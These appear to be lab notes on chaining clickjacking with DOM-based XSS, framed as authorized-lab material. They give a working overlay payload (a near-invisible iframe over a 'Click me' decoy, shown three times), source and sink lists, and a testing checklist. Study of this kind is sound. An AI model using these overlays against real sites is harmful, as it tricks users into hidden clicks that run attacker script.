# DOM XSS + Clickjacking Payload

## Purpose

Payload template for an authorized lab where a frameable page contains DOM-based XSS functionality that requires user interaction.

The technique combines:

```text
DOM XSS
    +
Clickjacking
```

---

## Basic Overlay

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://TARGET"></iframe>
```

---

## Final Payload

After correctly aligning the target interaction:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://TARGET"></iframe>
```

---

# DOM XSS Concept

The vulnerable flow should first be identified:

```text
Attacker-Controlled Source
        ↓
Client-Side JavaScript
        ↓
Dangerous DOM Sink
        ↓
DOM XSS
```

Potential sources may include:

```text
URL parameters
document.URL
document.location
document.referrer
window.name
```

Potential sinks may include:

```text
innerHTML
outerHTML
document.write()
eval()
```

The exact source and sink must be confirmed from the target application.

---

# Interaction Requirement

Determine whether the DOM XSS requires a user interaction.

For example:

```text
Page Loads
    ↓
Vulnerable Functionality Available
    ↓
User Click Required
    ↓
JavaScript Executes
```

If the vulnerability requires a click, clickjacking may provide the required interaction.

---

# Testing Workflow

```text
Identify DOM XSS
      ↓
Identify Source
      ↓
Identify Sink
      ↓
Confirm Vulnerability
      ↓
Identify Required Interaction
      ↓
Check Frameability
      ↓
Create iframe
      ↓
Create Decoy
      ↓
Align Target Interaction
      ↓
Test With Opacity
      ↓
Reduce Opacity
      ↓
Verify Complete Chain
```

---

# CSP Check

Inspect:

```http
Content-Security-Policy
```

Pay particular attention to:

```text
script-src
```

and other directives that may affect script execution.

For clickjacking itself, inspect:

```text
frame-ancestors
```

---

# Iframe Alignment

During testing:

```css
opacity: 0.1;
```

allows the target interface to remain visible.

Adjust:

```css
top
left
width
height
```

until the decoy is directly aligned with the interaction that triggers the vulnerable DOM functionality.

---

# Final Visibility

After successful alignment:

```css
opacity: 0.0001;
```

can be used.

---

# Generic Payload Structure

```html
<style>
    iframe {
        position: relative;
        width: WIDTHpx;
        height: HEIGHTpx;
        opacity: OPACITY;
        z-index: 2;
    }

    div {
        position: absolute;
        top: TOPpx;
        left: LEFTpx;
        z-index: 1;
    }
</style>

<div>DECOY TEXT</div>

<iframe src="TARGET"></iframe>
```

---

# Testing Checklist

```text
☐ Target is authorized
☐ DOM XSS source identified
☐ DOM XSS sink identified
☐ Vulnerability confirmed
☐ Required interaction identified
☐ CSP inspected
☐ Target page is frameable
☐ X-Frame-Options checked
☐ frame-ancestors checked
☐ iframe created
☐ Decoy created
☐ Decoy aligned
☐ Interaction verified
☐ Complete attack chain confirmed
```

---

# Important Distinction

The presence of:

```text
DOM XSS
```

and:

```text
Clickjacking
```

does not automatically prove that they can be chained.

The complete sequence must work:

```text
Frameable Page
      +
DOM XSS
      +
Required Interaction
      ↓
Combined Attack
```

---

# Key Learning

This payload demonstrates how clickjacking can act as the user-interaction component of a DOM XSS attack.

The important testing approach is to verify each stage independently before attempting the combined chain.